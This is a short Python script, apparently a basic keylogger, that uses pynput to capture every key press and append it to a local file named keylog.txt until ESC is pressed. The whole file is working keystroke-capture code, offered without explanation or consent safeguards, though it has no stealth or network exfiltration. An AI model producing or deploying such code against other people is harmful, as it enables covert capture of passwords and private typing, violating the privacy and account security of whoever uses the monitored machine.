import pynput

from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def log_key(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char:
                f.write(key.char)
            elif key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            else:
                f.write(f"[{key}]")
    except Exception as e:
         print(f"Error: {e}")

def stop_listener(key):
    if key == Key.esc:
        return False

with Listener(on_press=log_key, on_release=stop_listener) as listener:
    print("Keylogger running. Press 'ESC' to stop.")
    listener.join()